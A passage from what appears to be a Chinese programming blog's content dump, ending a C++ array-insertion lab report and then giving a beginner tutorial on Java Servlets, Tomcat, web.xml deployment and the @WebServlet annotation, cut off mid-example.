时间复杂度为O(n) 【实验结果】 附全部代码和实验运行结果截图： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;using namespace std;void alo_insert(int k,int a[],int &amp;n)&#123; int temp = 0; if(a[0]&lt;a[1]) &#123;&#123; if(k&gt;a[n-1]) &#123; a[n]=k; n++; return; &#125; for (int i=0; i&lt;n; i++) &#123; if(k&lt;a[i]) &#123; temp = i; break; &#125; &#125; for(int i=n-1; i&gt;=temp; i--) a[i+1] = a[i]; a[temp] = k; n++; &#125; &#125;int main()&#123; int n; cin&gt;&gt;n; int *a = new int[2*n](); for (int i =0; i&lt;n ; i++ ) cin&gt;&gt;a[i]; int new_n; cout&lt;&lt;&quot;请输入要插入的元素：&quot;&lt;&lt;endl; cin&gt;&gt;new_n;//输入要插入的元素 alo_insert(new_n,a,n); for (int i =0; i&lt;n ; i++ ) cout&lt;&lt;a[i]&lt;&lt; &#x27; &#x27;; delete []a;&#125; 运行结果如下：","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://1905060202.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"c/c++","slug":"c-c","permalink":"http://1905060202.github.io/tags/c-c/"},{"name":"算法设计与分析","slug":"算法设计与分析","permalink":"http://1905060202.github.io/tags/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90/"}]},{"title":"JavaWeb编程基础(Servlet)","date":"2021-11-23T08:43:45.000Z","path":"2021/11/23/JavaWeb编程基础-Servlet/","text":"JavaWeb编程基础（Servlet）最近在做一个SpringBoot的项目，当我真正动手写完了一个登陆功能之后，倏然觉得自己对整个JavaWeb的开发只停留在遵循规范这一层面，并未真正静下心来去思考原理。所以，基于这个原因，我准备从头开始学习JavaWeb的开发，彻底搞懂背后的细节。 2021.11.23 ServletServlet 是 Server Applet 的缩写，是一种使用 Java 语言来开发动态网站的技术。 Java 是一种功能强大的通用型编程语言，可以处理 HTTP 请求，可以访问数据库，可以生成 HTML 代码，您完全可以使用原生 Java 来开发动态网站。但是，使用原生 Java 开发动态网站非常麻烦，需要自己解析 HTTP 请求的报头，需要自己分析用户的请求参数，需要自己加载数据库组件……种种原因导致使用原生 Java 开发动态网站几乎是一件不能被接受的事情。正是基于这种原因，Java 官方后来推出了 Servlet 技术，它对开发动态网站需要使用的原生 Java API 进行了封装，形成了一套新的 API，称为 Servlet API。 使用 Servlet 开发动态网站非常方便，程序员只需要集中精力处理业务逻辑，不需要再为那些基础性的、通用性的功能编写代码，这使得 Servlet 在动态网站开发领域具备了很高的实用性。 Servlet 基于 Java，可以使用几乎全部的 Java API，所以它的功能异常强大，完全可以胜任企业级开发，能够处理那些高并发、大吞吐量、业务逻辑复杂的应用场景。 您可以这样理解，Servlet 是 Sun 公司推出的一种基于 Java 的动态网站开发技术。编写 Servlet 代码需要遵循 Java 语法，一个 Servlet 程序其实就是一个按照 Servlet 规范编写的 Java 类。Servlet 程序需要先编译成字节码文件（.class文件），然后再部署到服务器运行。 Servlet 是一种规范严格来说，Servlet 只是一套 Java Web 开发的规范，或者说是一套 Java Web 开发的技术标准。只有规范并不能做任何事情，必须要有人去实现它。所谓实现 Servlet 规范，就是真正编写代码去实现 Servlet 规范提到的各种功能，包括类、方法、属性等。 Servlet 规范是开放的，除了 Sun 公司，其它公司也可以实现 Servlet 规范，目前常见的实现了 Servlet 规范的产品包括 Tomcat、Weblogic、Jetty、Jboss、WebSphere 等，它们都被称为“Servlet 容器”。Servlet 容器用来管理程序员编写的 Servlet 类。 Servlet 接口所有的 Servlet 功能都是通过一个名为Servlet的接口（Interface）向外暴露的，编写 Servlet 代码，可以从实现 Servlet 接口开始，就像下面这样： 123· public class ServletDemo implements Servlet &#123;· //TODO:· &#125; 直接实现 Servlet 接口比较麻烦，需要实现很多方法，所以 Servlet 规范又提供了两个抽象类，分别是 GenericServlet 类和 HttpServlet 类，它们都实现了 Servlet 接口的很多常用功能。和 GenericServlet 类相比，HttpServlet 类更加方便，所以实际开发中一般都继承自 HttpServlet 类。 JSPServlet 是第一代 Java Web 开发技术，它将 HTML 代码以字符串的形式向外输出，编写 HTML 文档就是在拼接字符串，非常麻烦，所以 Java 官方又推出了第二代 Web 开发技术——JSP。 JSP 才是现代化的 Web 开发技术，它允许 HTML 代码和 JSP 代码分离，让程序员能够在 HTML 文档中直接嵌入 JSP 代码。 现在没有人直接使用 Servlet 开发动态网站，大家都转向了 JSP 阵营。但是 JSP 依赖于 Servlet，用户访问 JSP 页面时，JSP 代码会被翻译成 Servlet 代码，最终，HTML 代码还是以字符串的形式向外输出的。您看，JSP 只是在 Servlet 的基础上做了进一步封装。 JSP 代码可以调用 Servlet 类，程序员可以将部分功能在 Servlet 中实现，然后在 JSP 中调用即可。 总之，Servlet 是 JSP 的基础，Servlet 虽然不直接面向用户，但是它依然是 JSP 的后台支撑，想玩转 JSP，必须先玩转 Servlet。 学习顺序： · 学习 Servlet 的正确顺序是：Java –&gt; Servlet。 · 学习 JSP 的正确顺序是：Java –&gt; Servlet –&gt; JSP。 Servlet容器（Web容器）是什么Web 服务器初学者可能认为，只要有 Web 服务器，我们编写的网站代码就可以运行了，就可以访问数据库了，就可以注册登录并发布文章了，这其实是一种误解。 我们通常所说的 Web 服务器，比如 Apache、Nginx、IIS 等，它们的功能往往都比较单一，只能提供 http(s) 服务，让用户访问静态资源（HTML 文档、图片、CSS 文件、JavaScript 文件等），它们不能执行任何编程语言，也不能访问数据库，更不能让用户注册和登录。 也就是说，如果只有 Web 服务器，那您只能部署静态网站，不能部署动态网站。要想部署动态网站，必须要有编程语言运行环境（运行时，Runtime）的和数据库管理系统的支持。 运行环境（运行时）开发网站使用的编程语言一般都是脚本语言（比如 PHP、ASP、Python），部署网站时都是将源代码直接扔到服务器上，然而源代码自己并不能运行，必须要有解释器的支持；当用户访问动态页面时，解释器负责分析、编译和执行源代码，然后得到处理结果。 解释器是执行脚本语言的核心部件，除此以外还有一些辅助性的部件，例如： · 垃圾回收器：负责及时释放不需要的内存，腾出资源供其它页面使用； · 标准库：任何编程语言都会附带标准库，它们提供了很多通用性的功能，极大地提高了开发效率，避免重复造轮子。 我们习惯将以上各种支持脚本语言运行的部件统称为运行环境，或者运行时（Runtime）。 数据库Web 服务器不带数据库，编程语言也不带数据库，数据库是一款独立的软件；要想实现用户注册、发布文章、提交评论等功能，就必须安装一款数据库，比如 MySQL、Oracle、SQL Server 等。 总结部署动态网站一般至少需要三个组件，分别是 Web 服务器、脚本语言运行时和数据库，例如，部署 PHP 网站一般选择「Apache + PHP 运行时 + MySQL」的组合。 Web 容器我们知道，Servlet 是基于 Java 语言的，运行 Servlet 必然少不了 JRE 的支持，它负责解析和执行字节码文件（.class文件）。然而 JRE 只包含了 Java 虚拟机（JVM）、Java 核心类库和一些辅助性性文件，它并不支持 Servlet 规范。要想运行 Servlet 代码，还需要一种额外的部件，该部件必须支持 Servlet 规范，实现了 Servlet 接口和一些基础类，这种部件就是 Servlet 容器。 Servlet 容器就是 Servlet 代码的运行环境（运行时），它除了实现 Servlet 规范定义的各种接口和类，为 Servlet 的运行提供底层支持，还需要管理由用户编写的 Servlet 类，比如实例化类（创建对象）、调用方法、销毁类等。 Servlet 中的容器和生活中的容器是类似的概念：生活中容器用来装水、装粮食，Servlet 中的容器用来装类，装对象。 读者可能会提出疑问，我们自己编写的 Servlet 类为什么需要 Servlet 容器来管理呢？这是因为我们编写的 Servlet 类没有 main() 函数，不能独立运行，只能作为一个模块被载入到 Servlet 容器，然后由 Servlet 容器来实例化，并调用其中的方法。 一个动态页面对应一个 Servlet 类，开发一个动态页面就是编写一个 Servlet 类，当用户请求到达时，Servlet 容器会根据配置文件（web.xml）来决定调用哪个类。 下图演示了 Servlet 容器在整个 HTTP 请求流程中的位置： 您看，Web 服务器是整个动态网站的“大门”，用户的 HTTP 请求首先到达 Web 服务器，Web 服务器判断该请求是静态资源还是动态资源：如果是静态资源就直接返回，此时相当于用户下载了一个服务器上的文件；如果是动态资源将无法处理，必须将该请求转发给 Servlet 容器。 Servlet 容器接收到请求以后，会根据配置文件（web.xml）找到对应的 Servlet 类，将它加载并实例化，然后调用其中的方法来处理用户请求；处理结束后，Servlet 容器将处理结果再转交给 Web 服务器，由 Web 服务器将处理结果进行封装，以 HTTP 响应的形式发送给最终的用户。 常用的 Web 容器有 Tomcat、Jboss、Jetty、WebLogic 等，其中 Tomcat 由 Java 官方提供，是初学者最常使用的。 为了简化部署流程，Web 容器往往也会自带 Web 服务器模块，提供基本的 HTTP 服务，所以您可以不用再安装 Apache、IIS、Nginx 等传统意义上的服务器，只需要安装一款 Web 容器，就能部署 Servlet 网站了。正是由于这个原因，有的教材将 Tomcat 称为 Web 容器，有的教材又将 Tomcat 称为 Web 服务器，两者的概念已经非常模糊了。 将 Web 容器当做服务器使用后，上面的流程图就变成了下面的样子： 注意，Servlet 容器自带的 Web 服务器模块虽然没有传统的 Web 服务器强大，但是也足以应付大部分开发场景，对初学者来说是足够的。当然，您也可以将传统的 Web 服务器和 Servlet 容器组合起来，两者分工协作，各司其职，共同完成 HTTP 请求。 总结Servlet 容器就是 Servlet 程序的运行环境，它主要包含以下几个功能： · 实现 Servlet 规范定义的各种接口和类，为 Servlet 的运行提供底层支持； · 管理用户编写的 Servlet 类，以及实例化以后的对象； · 提供 HTTP 服务，相当于一个简化的服务器。 Tomcat目录结构Tomcat 解压完成以后会看到如表1所示的很多目录，这些目录都有各自的用途，初学者有必要了解一下。 Tomcat 子目录及其说明 子目录 说明 bin 命令中心（启动命令，关闭命令……） conf 配置中心（端口号，内存大小……） lib Tomcat 的库文件。Tomcat 运行时需要的 jar 包所在的目录。 logs 存放日志文件。 temp 存储临时产生的文件，即缓存。 webapps 存放项目的文件，web 应用放置到此目录下浏览器可以直接访问。 work 编译以后的 class 文件。 1. bin 目录bin 目录用来存放 Tomcat 命令，主要分为两大类，一类是以.sh结尾的 Linux 命令，另一类是以.bat结尾的 Windows 命令。很多环境变量都在此处设置，例如 JDK 路径、Tomcat 路径等。 图1：bin 目录包含的内容 下面是几个常用的 Tomcat 命令： · startup.sh/startup.bat：用来启动 Tomcat； · shutdown.sh/shutdown.bat：用来关闭 Tomcat； · catalina.bat/ catalina.bat：用来设置 Tomcat 的内存。 2. conf 目录conf 目录主要是用来存放 Tomcat 的配置文件，如下图所示： 图2：conf 目录包含的内容 下面是常用到的几个文件： · server.xml 用来设置域名、IP、端口号、默认加载的项目、请求编码等； · context.xml 用来配置数据源等； · tomcat-users.xml 用来配置和管理 Tomcat 的用户与权限； · web.xml 可以设置 Tomcat 支持的文件类型； · 在 Catalina 目录下可以设置默认加载的项目。 3. lib 目录lib 目录主要用来存放 Tomcat 运行需要加载的 jar 包。 图3：lib 目录包含的内容 4. logs 目录logs 目录用来存放 Tomcat 在运行过程中产生的日志文件，清空该目录中的文件不会对 Tomcat 的运行带来影响。 在 Windows 系统中，控制台的输出日志在 catalina.xxxx-xx-xx.log 文件中；在 Linux 系统中，控制台的输出日志在 catalina.out 文件中。 5. temp 目录temp 目录用来存放 Tomcat 在运行过程中产生的临时文件，清空该目录中的文件不会对 Tomcat 的运行带来影响。 图4：temp 目录包含的内容 6. webapps 目录webapps 目录用来存放应用程序（也就是通常所说的网站），当 Tomcat 启动时会去加载 webapps 目录下的应用程序，我们编写的 Servlet 程序就可以放在这里。Tomcat 允许以文件夹、war 包、jar 包的形式发布应用。 图5：webapps 目录包含的内容 7. work 目录work 目录用来存放 Tomcat 在运行时的编译文件（也即 class 字节码文件），例如 JSP 编译后的文件。清空 work 目录，然后重启 Tomcat，可以达到清除缓存的作用。 Servlet三种创建方式在 Servlet 中，一个动态网页对应一个 Servlet 类，我们可以通过 web.xml 配置文件将 URL 路径和 Servlet 类对应起来。访问一个动态网页的过程，实际上是将对应的 Servlet 类加载、实例化并调用相关方法的过程；网页上显示的内容，就是通过 Servlet 类中的某些方法向浏览器输出的 HTML 语句。 所以，使用 Servlet 创建动态网页的第一步，就是创建 Servlet 类。 Servlet 规范的最顶层是一个名为 javax.servlet.Servlet 的接口，所有的 Servlet 类都要直接或者间接地实现该接口。直接实现 Servlet 接口不太方便，所以 Servlet 又内置了两个 Servlet 接口的实现类（抽象类），分别为 GenericServlet 和 HttpServlet，因此，创建 Servlet 类有如下三种方式： 实现 javax.servlet.Servlet 接口，重写其全部方法。 继承 javax.servlet.GenericServlet 抽象类，重写 service() 方法。 继承 javax.servlet.http.HttpServlet 抽象类，重写 doGet() 或 doPost() 方法。 Servlet、GenericServlet 、HttpServlet 的关系下图展示了 Servlet、GenericServlet 以及 HttpServlet 三者之间的关系，其中 MyServlet 是我们自定义的 Servlet 类。 由上图可知： GenericServlet 是实现了 Servlet 接口的抽象类。 HttpServlet 是 GenericServlet 的子类，具有 GenericServlet 的一切特性。 Servlet 程序（MyServlet 类）是一个实现了 Servlet 接口的 Java 类。 Servlet 接口javax.servlet.Servlet 是 Servlet API 的核心接口，所有的 Servlet 类都直接或间接地实现了这一接口。 Servlet 接口中定义了 5 个方法，下面我们对他们做简单的介绍。 返回值 方法 备注 void init(ServletConfig config) Servlet 实例化之后，由 Servlet 容器调用，用来初始化 Servlet 对象。该方法只能被调用一次。 参数 config 用来向 Servlet 传递配置信息。 void service(ServletRequest req,ServletResponse res) Servlet 容器调用该方法处理客户端请求。 void destroy() 服务器关闭、重启或者 Servlet 对象被移除时，由 Servlet 容器调用，负责释放 Servlet 对象占用的资源。 ServletConfig getServletConfig() 该方法用来获取 ServletConfig 对象，该对象中包含了 Servlet 的初始化参数。 String getServletInfo() 该方法用于获取 Servlet 的信息，例如作者、版本、版权等。 示例 1通过实现 Servlet 接口创建 Servlet，示例代码如下。 12345678910111213141516171819202122232425262728293031323334353637383940411. package net.biancheng.www;2. 3. import javax.servlet.*;4. import java.io.IOException;5. import java.io.PrintWriter;6. 7. public class MyServlet implements Servlet &#123;8. 9. //Servlet 实例被创建后，调用 init() 方法进行初始化，该方法只能被调用一次10. @Override11. public void init(ServletConfig servletConfig) throws ServletException &#123;12. &#125;13. 14. //返回 ServletConfig 对象，该对象包含了 Servlet 的初始化参数15. @Override16. public ServletConfig getServletConfig() &#123;17. return null;18. &#125;19. 20. //每次请求，都会调用一次 service() 方法21. @Override22. public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;23. //设置字符集24. servletResponse.setContentType(&quot;text/html;charset=UTF-8&quot;);25. //使用PrintWriter.write()方法向前台页面输出内容26. PrintWriter writer = servletResponse.getWriter();27. writer.write(&quot;胡小宁的博客欢迎你的到来，网址: 1905060202.github.io&quot;);28. writer.close();29. &#125;30. 31. //返回关于 Servlet 的信息，例如作者、版本、版权等32. @Override33. public String getServletInfo() &#123;34. return null;35. &#125;36. 37. //Servelet 被销毁时调用38. @Override39. public void destroy() &#123;40. &#125;41. &#125; GenericServlet 抽象类javax.servlet.GenericServlet 实现了 Servlet 接口，并提供了除 service() 方法以外的其他四个方法的简单实现。通过继承 GenericServlet 类创建 Servlet ，只需要重写 service() 方法即可，大大减少了创建 Servlet 的工作量。 GenericServlet 类中还提供了以下方法，用来获取 Servlet 的配置信息。 返回值 方法 备注 String getInitParameter(String name) 返回名字为 name 的初始化参数的值，初始化参数在 web.xml 中进行配置。如果参数不存在，则返回 null。 Enumeration getInitParameterNames() 返回 Servlet 所有初始化参数的名字的枚举集合，若 Servlet 没有初始化参数，返回一个空的枚举集合。 ServletContext getServletContext() 返回 Servlet 上下文对象的引用。 String getServletName() 返回此 Servlet 实例的名称。 示例 2通过继承 GenericServlet 抽象类创建 Servlet，示例代码如下。 1234567891011121314151617181. package net.biancheng.www;2. 3. import javax.servlet.*;4. import java.io.IOException;5. import java.io.PrintWriter;6. 7. public class MyServlet extends GenericServlet &#123;8. 9. @Override10. public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;11. //设置字符集12. servletResponse.setContentType(&quot;text/html;charset=UTF-8&quot;);13. //使用PrintWriter.write()方法向前台页面输出内容14. PrintWriter writer = servletResponse.getWriter();15. writer.write(&quot;胡小宁的博客欢迎你的到来，网址: 1905060202.github.io &quot;);16. writer.close();17. &#125;18. &#125; HttpServlet 抽象类javax.servlet.http.HttpServlet 继承了 GenericServlet 抽象类，用于开发基于 HTTP 协议的 Servlet 程序。由于 Servlet 主要用来处理 HTTP 的请求和响应，所以通常情况下，编写的 Servlet 类都继承自 HttpServlet。 在 HTTP/1.1 协议中共定义了 7 种请求方式，即 GET、POST、HEAD、PUT、DELETE、TRACE 和 OPTIONS。 HttpServlet 针对这 7 种请求方式分别定义了 7 种方法，即 doGet()、doPost()、doHead()、doPut()、doDelete()、doTrace() 和 doOptions()。 HttpServlet 重写了 service() 方法，该方法会先获取客户端的请求方式，然后根据请求方式调用对应 doXxx 方法。 示例 3由于我们使用的请求方式主要是 GET 和 POST，所以通过继承 HttpServlet 类创建 Servlet 时，只需要重写 doGet 或者 doPost 方法，代码如下。 1234567891011121314151617181920212223242526271. package net.biancheng.www;2. 3. import javax.servlet.*;4. import javax.servlet.http.HttpServlet;5. import javax.servlet.http.HttpServletRequest;6. import javax.servlet.http.HttpServletResponse;7. import java.io.IOException;8. import java.io.PrintWriter;9. 10. public class MyServlet extends HttpServlet &#123;11. 12. public void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;13. //使用PrintWriter.write()方法向前台页面输出内容14. resp.setContentType(&quot;text/html;charset=UTF-8&quot;);15. PrintWriter writer = resp.getWriter();16. writer.write(&quot;胡小宁的博客欢迎你的到来，网址: 1905060202.github.io &quot;);17. writer.close();18. &#125;19. 20. public void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;21. //使用PrintWriter.write()方法gaifang向前台页面输出内容22. PrintWriter writer = resp.getWriter();23. writer.write(&quot;胡小宁的博客欢迎你的到来，网址: 1905060202.github.io &quot;);24. writer.close();25. doGet(req, resp);26. &#125;27. &#125; 总结上面演示了三种创建 Servlet 的方式，那么在实际开发中，我们究竟该选择哪一种呢？下面我们就来分析和对比一下。 1) Servlet 接口通过实现 Servlet 接口创建 Servlet 类，需要重写其全部的方法，比较繁琐，所以我们很少使用该方法创建 Servlet。 2) GenericServlet 类GenericServlet 抽象类实现了 Servlet 接口，并对 Servlet 接口中除 service() 方法外的其它四个方法进行了简单实现。通过继承 GenericServlet 创建 Servlet，只需要重写 service() 方法即可，大大减少了创建 Servlet 的工作量。 Generic 是“通用”的意思，正如其名，GenericServlet 是一个通用的 Servlet 类，并没有针对某种场景进行特殊处理，尤其是 HTTP 协议，我们必须手动分析和封装 HTPP 协议的请求信息和响应信息。 3) HttpServlet 类HttpServlet 是 GenericServlet 的子类，它在 GenericServlet 的基础上专门针对 HTTP 协议进行了处理。HttpServlet 为 HTTP 协议的每种请求方式都提供了对应的方法，名字为 doXxx()，例如： · 处理 GET 请求的方法为 doGet()； · 处理 POST 请求的方法为 doPost()。 正如其名，HttpServlet 就是专为 HTTP 协议而量身打造的 Servlet 类。 在互联网上，人们都是通过 HTTP 协议来访问动态网页的，其中使用最频繁的就是 GET 方式和 POST 方式，因此，我们通常基于 HttpServlet 来创建 Servlet 类，这样就省去了处理 HTTP 请求的过程。 Servlet的部署和访问Servlet 没有 main() 方法，不能独立运行，但它可以作为 JavaWeb 应用的一个组件被部署到 Servlet 容器中，由容器来实例化和调用 Servlet 的方法，例如：doGet() 、doPost() 等。 那么，JavaWeb 应用是什么呢？Servlet 是如何部署和访问的呢？本节我们将针对这些问题进行讲解。 JavaWeb 应用JavaWeb 应用由一组 Servlet/JSP、HTML 文件、相关 Java 类、以及其他的资源组成，它可以在由各种供应商提供的 Servlet 容器中运行。由 JavaWeb 应用的定义可知， Servlet 是 JavaWeb 应用的一个组件。 为了让 Servlet 容器顺利地找到 JavaWeb 应用的各个组件，Servlet 规范规定，JavaWeb 应用必须采用固定的目录结构，即每种组件在 JavaWeb 应用中都有固定的存放目录。 以 Tomcat 为例，通常将 JavaWeb 应用存放到 Tomcat 的 webapps 目录下。在 webapps 下，每一个子目录都是一个独立的 Web 应用，子目录的名字就是 Web 应用的名字，也被称为 Web 应用的上下文根。用户可以通过这个上下文根来访问 JavaWeb 应用中的资源。 webapps 的目录结构如下图。 下表中对 webapps 下各个目录进行了介绍。 目录 描述 是否必需 \\servletDemo Web 应用的根目录，属于该 Web 应用的所有资源都存放在这个目录下。 是 \\servletDemo\\WEB-INF 存放 web.xml、lib 目录以及 classes 目录等。 是 \\servletDemo\\WEB-INF\\classes 存放各种 .class 文件或者包含 .class 文件的目录，Servlet 类的 .class 文件也存放在此。 否 \\servletDemo\\WEB-INF\\lib 存放应用所需的各种 jar 包，例如 JDBC 驱动程序的 jar 包。 否 \\servletDemo\\WEB-INF\\web.xml web.xml 中包含应用程序的配置和部署信息。 是 部署在 Tomcat 中部署 JavaWeb 应用最快捷的方式，就是直接将 JavaWeb 应用的所有文件复制到 Tomcat 的 /webapps 目录下。在默认情况下，Tomcat 会自动加载 webapps 目录下的 JavaWeb 应用，并把它发布到名为 localhost 的虚拟主机中。 Tomcat 既可以运行采用开放式目录结构（只编译不打包）的 Web 应用，也可以运行 Web 应用的打包文件（WAR 文件）。在开发阶段，为了方便程序调试，通常采用开放式的目录结构部署 JavaWeb 应用。在开发完成，进入产品发布阶段时，就应该将整个应用打包成 WAR 文件，再进行部署。 即使采用 WAR 文件的形式发布，Tomcat 启动时也会将 WAR 文件自动展开为开放式的目录结构。 在本案例中，我们将采用开放式的目录结构进行部署，具体操作步骤如下。 1. 进入 Windows DOS 命令行窗口我们知道，编译 Java 源代码一般可以通过两种方式完成：DOS 命令行 和 IDE（集成开发环境）。使用 IDE 可以一键完成编译工作，十分的方便，但 IDE 给我们带来方便的同时，也隐藏了编译过程中的许多细节，我们无法了解其中的原理和机制。 对于初学者来说，为了更加深刻地理解 Servlet 的运行原理和机制，最好的办法就是使用 DOS 命令行进行编译。 使用快捷键 “Windows + R”，打开运行对话框，在对话框输入cmd，点击“确定”，进入 Windows 系统命令行窗口，如图。 2. 引入 javax.servlet 包由于 Servlet 是 JavaEE 下的技术标准，不是 JDK 的组成部分，所以在编译 Servlet 前，需要先引入 servlet-api.jar 包（在 Apache Tomcat 安装目录下的 lib 文件夹中提供了此 jar 包）。 使用命令set classpath可以将 servlet-api.jar 引入，该命令的语法如下，其中 path 表示引入 jar 包的路径。 1· set classpath = path 为了方便操作，可以先在命令行中输入set classpath=，然后将 servlet-api.jar 文件拖进命令行内，回车执行。 注：**set classpath**命令用来为当前窗口设置临时环境变量，只在当前窗口下有效。** ** 3. 编译 Servlet1）在命令提示符中使用 cd命令进入 MyServlet.java 所在的目录。 2）使用 javac -encoding UTF-8 -d . MyServlet.java命令进行编译，若没有报错，则编译成功。 其中： · javac ：编译命令； · -encoding UTF-8：用于指定编译源文件时的字符编码，这里指定为 UTF-8； · javac -d：带包编译 ； · .：表示当前位置。 3）进入 MyServlet.java 文件所在的目录，可发现新增了编译后的目录和 .classes 字节码文件，自此我们就完成了对 Servlet 的编译工作。 4. 创建目录结构在完成对 Servlet 的编译后，下一步依照 JavaWeb 应用的固定目录结构，在 Tomcat 中为该 Servlet 创建目录。 在 Tomcat 的 webapps 目录中创建 servletDemo（web 应用的名字，由自己定义）文件夹； 在 servletDemo 文件夹内创建 WEB-INF 文件夹； 在 WEB-INF 内创建 classes 文件夹； 在 WEB-INF 内创建配置文件 web.xml（可以复制 \\webapps\\ROOT\\WEB-INF 中的 web.xml 使用）。 5. 将 Servlet 移动到 Tomcat 目录中将编译好的字节码和目录移动到 Tomcat\\webapps\\servletDemo\\WEB-INF\\classes 目录下。 6. 配置 web.xml对 webapps\\servletDemo\\WEB-INF 目录的 web.xml 中进行配置，具体配置代码如下。 1234567891011121314151. &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;2. &lt;web-app xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot;3. xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;4. xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee5. http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;6. version=&quot;3.0&quot; metadata-complete=&quot;true&quot;&gt;7. &lt;servlet&gt;8. &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;9. &lt;servlet-class&gt;io.github.1905060202.www.MyServlet&lt;/servlet-class&gt;10. &lt;/servlet&gt;11. &lt;servlet-mapping&gt;12. &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;13. &lt;url-pattern&gt;/MyServlet&lt;/url-pattern&gt;14. &lt;/servlet-mapping&gt;15. &lt;/web-app&gt; web.xml 中各元素含义及用法如下： · ： 根元素。 · ：用于注册 Servlet，即给 Servlet 起一个独一无二的名字。 · 包含两个主要的子元素 和 ，分别用于指定 Servlet 的名称和 Servlet 的完整限定名（包名+类名）。 · ：用于定义 Servlet 与 URL 之间的映射。 · 包含两个子元素 和 ，分别用于指定 Servlet 的名称和虚拟路径。 访问进入 Tomcat\\bin 目录下双击 startup.bat，启动 Tomcat。 Tomcat 启动成功后，在地址栏中输入“http://localhost:8080/servletDemo/MyServlet”，访问 MyServlet，结果如下图。 访问路径 http://localhost:8080/servletDemo/MyServlet 中，各部分含义如下： · http:// 表示 HTTP 协议； · localhost: 表示服务器 IP； · 8080 表示端口号； · /servletDemo 表示 Web 应用的上下文根路径； · /MyServlet 表示资源路径，即 web.xml 中 元素的取值。 IDEA创建Servlet项目概述之前发现 IDEA 没法新建 Servlet 项目，正好最近要用 Servlet 写个小项目，开个文章记录一下。 本文使用的 IDEA 版本为 2020.2 准备工作 首先新建项目 选择 Java 项目，直接 Next 继续 Next 修改一下 Project Name，点击 Finish 添加 Framework 在工程上右键，选择 Add Framework Support 勾选 Web Application，点击 OK 可以看到工程结构下多了个 web 目录 新建文件夹 在 web/WEB-INF 目录下新建一个 classes 文件夹 配置 Project Structure 在 Modules——Path 下，修改 Compiler Output，选择 Use module compile output path，修改两个内容框为刚才新建的 classes 目录，点击时工构发生变化 导入 servlet-api.jar 下载 tomcat，我下载的是 tomcat8 https://tomcat.apache.org/ 进入 Project Structure——Modules——Dependencies，点击下面的加号 选择 JARs or directories，找到刚才下载解压的 tomcat 目录中的 lib 文件夹下的 servlet-api.jar，确定。 添加完成后选择 OK 即可 创建 Servlet 测试 在 src 下新建一个测试用的 Servlet 123456789101112131415161718192021222324252627282930313233343536373839404142· package com.wanvale.lms;· · · · import javax.servlet.ServletException;· · import javax.servlet.annotation.WebServlet;· · import javax.servlet.http.HttpServlet;· · import javax.servlet.http.HttpServletRequest;· · import javax.servlet.http.HttpServletResponse;· · import java.io.IOException;· · · · @WebServlet(&#123;&quot;/test&quot;, &quot;/get&quot;&#125;)· · public class test extends HttpServlet &#123;· · @Override· · protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;· · resp.getWriter().write(&quot;POST Method&quot;);· · &#125;· · · · @Override· · protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;· · resp.getWriter().write(&quot;GET Method&quot;);· · &#125;· · &#125;· 选择菜单栏中的 Run——Run 选择 Edit Configuration 添加一个 Local Tomcat Server 点击 Configure 添加 Tomcat 选择 Tomcat 路径，点击 OK 配置一下 Deployment 和 Server 的参数 点击 Run，等待 Server 跑起来以后访问测试一下 至此，配置运行结束。 @WebServlet注解（Servlet注解）在 Servlet 中，web.xml 扮演的角色十分的重要，它可以将所有的 Servlet 的配置集中进行管理，但是若项目中 Servelt 数量较多时，web.xml 的配置会变得十分的冗长。这种情况下，注解（Annotation）就是一种更好的选择。 与 XML 不同，注解不需要依赖于配置文件，它可以直接在类中使用，其配置只对当前类有效，这样就避免了集中管理造成的配置冗长问题。那么 Servelt 支持注解吗？ 为了简化 Servlet 的配置，Servlet 3.0 中增加了注解支持，例如：@WebServlet、@WebInitParm 、@WebFilter 和 @WebLitener 等，这使得 web.xml 从 Servlet 3.0 开始不再是必选项了。下面我们对 @WebServlet 进行介绍。 @WebServlet 注解的属性@WebServlet 用于将一个类声明为 Servlet，该注解会在部署时被容器处理，容器根据其具体的属性配置将相应的类部署为 Servlet。该注解具有下表给出的一些常用属性。 属性名 类型 标签 描述 是否必需 name String 指定 Servlet 的 name 属性。 如果没有显式指定，则取值为该 Servlet 的完全限定名，即包名+类名。 否 value String[ ] 该属性等价于 urlPatterns 属性，两者不能同时指定。 如果同时指定，通常是忽略 value 的取值。 是 urlPatterns String[ ] 指定一组 Servlet 的 URL 匹配模式。 是 loadOnStartup int 指定 Servlet 的加载顺序。 否 initParams WebInitParam[ ] 指定一组 Servlet 初始化参数。 否 asyncSupported boolean 声明 Servlet 是否支持异步操作模式。 否 description String 指定该 Servlet 的描述信息。 否 displayName String 指定该 Servlet 的显示名。 否 @WebServlet 注解的使用1. 启用注解支持web.xml 的顶层标签 中有一个属性：metadata-complete，该属性用于指定当前 web.xml 是否是完全的。若该属性设置为 true，则容器在部署时将只依赖 web.xml，忽略所有的注解。若不配置该属性，或者将其设置为 false，则表示启用注解支持。 123456781. &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;2. &lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;3. xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;4. xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee 